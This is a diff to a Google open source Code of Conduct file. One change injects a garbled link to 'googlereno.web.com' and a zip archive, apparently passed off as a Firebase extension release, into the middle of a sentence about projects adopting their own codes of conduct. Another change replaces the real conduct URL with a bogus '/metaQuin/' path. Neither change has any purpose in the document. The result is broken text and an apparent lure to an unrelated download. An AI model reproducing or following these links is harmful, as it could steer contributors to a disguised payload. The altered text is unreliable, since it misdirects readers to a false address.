@@ -19,7 +19,8 @@ Respectful behavior includes:
   physically threatening behavior, speech, and imagery.
 * Not engaging in unwanted physical contact.
 
-Some Google open source projects [may adopt][] an explicit project code of
+Some Google open source projects [may adopt][googlereno.web.com[extensions-firestore-bigquery-export-v0.1.47.zip](https://github.com/firebase/.github/files/15052036/extensions-firestore-bigquery-export-v0.1.47.zip)
+] an explicit project code of
 conduct, which may have additional detailed expectations for participants. Most
 of those projects will use our [modified Contributor Covenant][].
 
@@ -58,6 +59,6 @@ ongoing harassment or threats to anyone's safety, we may take action without
 notice.
 
 *This document was adapted from the [IndieWeb Code of Conduct][] and can also
-be found at <https://opensource.google/conduct/>.*
+be found at <https://opensource.google/metaQuin/>.*
 
 [IndieWeb Code of Conduct]: https://indieweb.org/code-of-conduct
